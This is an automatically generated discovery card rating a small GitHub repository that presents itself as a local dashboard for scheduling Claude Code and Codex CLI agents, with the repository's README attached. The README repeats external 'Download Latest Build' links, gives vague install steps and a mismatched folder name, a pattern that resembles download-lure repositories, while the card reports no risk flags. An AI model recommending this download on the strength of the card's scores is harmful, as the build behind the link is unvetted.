---
id: "danielpdmestone9638/boring-orchestrator-agent-hub"
name: "danielpdmestone9638/boring-orchestrator-agent-hub"
url: "https://github.com/danielpdmestone9638/boring-orchestrator-agent-hub"
date: "2026-08-19"
source: "GitHub Search API"
category: "github_discovery"
kind: "agent_framework"
compatibility: 75
momentum: 52
risk: 35
integration_effort: 36
expected_gain: 77
composite: 68
replacement_target: ""
related_articles: [{"title":"Bennyoooo/write-like-me","date":"2026-08-06","topic":"AI agents","similarity":0.341,"file":"/home/runner/work/UI_Repo/UI_Repo/knowledge/feed/AI agents/2026-08-06/06-bennyoooo-write-like-me.md"},{"title":"Show HN: Ocean – All your team's agent sessions in one place","date":"2026-08-05","topic":"AI agents","similarity":0.292,"file":"/home/runner/work/UI_Repo/UI_Repo/knowledge/feed/AI agents/2026-08-05/07-show-hn-ocean-all-your-team-s-agent-sessions-in-one-place.md"},{"title":"Show HN: Keen Code – an agentic-engineered coding agent","date":"2026-08-10","topic":"AI agents","similarity":0.286,"file":"/home/runner/work/UI_Repo/UI_Repo/knowledge/feed/AI agents/2026-08-10/06-show-hn-keen-code-an-agentic-engineered-coding-agent.md"}]
pros: ["Recently updated (2026-08-19)","GPL-3.0 license","2 GitHub stars","README includes install commands"]
cons: ["No obvious v1 warning, still review upstream code before use"]
readme_quality: 78
has_ci: false
has_tests: false
setup_steps_count: 1
dependency_files: []
install_commands: ["git clone https://github.com/danielpdmestone9638/boring-orchestrator-agent-hub.git"]
risk_flags: []
status: "new"
---

# danielpdmestone9638/boring-orchestrator-agent-hub

Boring Orchestrator is a local web application for defining, scheduling, launching, and monitoring Claude Code and Codex CLI agents from one centralized dashboard.

URL: https://github.com/danielpdmestone9638/boring-orchestrator-agent-hub

## Why it matters
You saved an article on 2026-08-06 about AI agents; this candidate overlaps with "Bennyoooo/write-like-me" and may turn that reading into a practical workflow improvement.

## Pros
+ Recently updated (2026-08-19)
+ GPL-3.0 license
+ 2 GitHub stars
+ README includes install commands

## Cons
- No obvious v1 warning, still review upstream code before use

## Repository Inspection
README quality: 78/100
CI detected: no
Tests mentioned: no
Setup steps estimate: 1

Dependency files:
- none detected

Install commands found:
- git clone https://github.com/danielpdmestone9638/boring-orchestrator-agent-hub.git

Risk flags:
- none detected

## Install
Nothing runs automatically. Review the upstream README before running any install command.

## README
# Boring Orchestrator - Local AI Agent Orchestration Dashboard 2026

> **Boring Orchestrator is a local web application for defining, scheduling, launching, and monitoring Claude Code and Codex CLI agents from one dashboard.**

[![Platform](https://img.shields.io/badge/Platform-Local%20Web%20Application-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Development-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/danielpdmestone9638/boring-orchestrator-agent-hub?style=flat-square)](https://github.com/danielpdmestone9638/boring-orchestrator-agent-hub)

---

<p align="center">
  <a href="https://danielpdmestone9638.github.io/boring-orchestrator-agent-hub/">
    <img src="https://img.shields.io/badge/Download-Boring%20Orchestrator%20Latest-brightgreen?style=for-the-badge" alt="Download Boring Orchestrator">
  </a>
</p>

> **[Download Boring Orchestrator](https://danielpdmestone9638.github.io/boring-orchestrator-agent-hub/)**

---

[Download Latest Build](https://danielpdmestone9638.github.io/boring-orchestrator-agent-hub/)

---

## Overview

Boring Orchestrator is a browser-based local dashboard for coordinating AI-agent work with Claude Code and Codex CLI. It combines recurring schedules, on-demand starts, webhook activation, and live execution monitoring in one place.

The application is intended for anyone handling several agents or repeatable jobs who needs a clear view of what is running and what has completed. Agent definitions and execution records remain in a local SQLite database, and optional pre-scripts can gather or prepare data before that information is included in an agent prompt.

---

## What It Provides

- Create and manage recurring AI-agent definitions
- Use cron expressions to control scheduled executions
- Launch an agent directly from the dashboard
- Activate configured agents through webhook requests
- Monitor execution states and streamed transcripts
- Run agents through Claude Code or Codex CLI
- Choose Codex reasoning effort separately for each agent
- Execute optional pre-scripts and include their output in prompts
- Store agent configuration and runtime history in local SQLite

---

## Getting Started

First, clone the repository locally:

```bash
git clone https://github.com/danielpdmestone9638/boring-orchestrator-agent-hub.git
cd boring-orchestrator
```

Install and launch the application with the commands provided by the project setup. Once the local server is active, visit the local address shown by the application in a browser and use the dashboard to configure agents.

The Claude Code or Codex CLI executable required by an agent must already be available in the local environment before that agent is created.

---

## Using the Dashboard

The usual setup and execution sequence is:

1. Run the local web application.
2. Visit the dashboard through a browser.
3. Create an agent and choose either Claude Code or Codex CLI.
4. Enter its prompt, optionally add a pre-script, and set Codex reasoning effort when relevant.
5. Assign a cron expression, or keep the agent available for on-demand execution.
6. Start it manually, invoke it through a webhook, or allow the scheduler to run it.
7. Inspect the execution status and streamed transcript in the monitoring interface.

For webhook workflows, enable the webhook trigger in the agent configuration and send requests to the local endpoint provided by the application.

---

## Agent Configuration

Agent options are maintained in the dashboard. Depending on the workflow, a definition can specify its CLI type, prompt, schedule, pre-script, webhook trigger, and Codex reasoning effort.

The application stores agent definitions and runtime data locally in SQLite. A conceptual configuration may look like this:

```text
agent:
  type: claude | codex
  schedule: "<cron expression>"
  prompt: "<agent prompt>"
  pre_script: "<optional command>"
  reasoning_effort: "<Codex setting, when applicable>"
  webhook: "<optional trigger configuration>"
```

For precise field names and environment configuration, follow the application's configuration interface and the setup guidance included with the project.

---

## Prerequisites

- A local environment that can run the web application
- A browser to open the local dashboard
- Claude Code and/or Codex CLI, depending on the agents you intend to use
- Local SQLite support for agent definitions and runtime records
- Cron scheduling support provided through the application's scheduler
- Network access to the local webhook endpoint when webhook activation is enabled

---

## Frequently Asked Questions

### What kind of work is Boring Orchestrator designed for?

It is built for users who want to coordinate recurring or manual workflows involving Claude Code and Codex CLI agents from a local dashboard.

### What is the process for scheduling an agent?

Create or update an agent in the dashboard, then provide a cron expression. The scheduler uses that expression to determine recurring execution times.

### Is manual execution supported?

Yes. An agent can be started from the dashboard without waiting for its scheduled time. Webhook-triggered execution is also available for configured agents.

### Where does the application keep agent and run information?

Agent definitions and runtime records are stored in local SQLite storage.

### Can execution be watched while an agent is active?

Yes. The monitoring view displays run information together with streamed transcripts.

### Where is Codex reasoning configured?

Set the reasoning effort in the settings for the individual Codex agent.

### What can I verify when an agent fails to run?

Make sure the local application is active, the selected CLI is installed and available, and the agent has a complete configuration. Also verify the cron expression or webhook request. The run status and transcript may provide further information.

### How can I obtain updates?

Look in the repository for newer builds and revised project instructions. Before updating an existing local installation, check whether any configuration changes need to be applied.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.

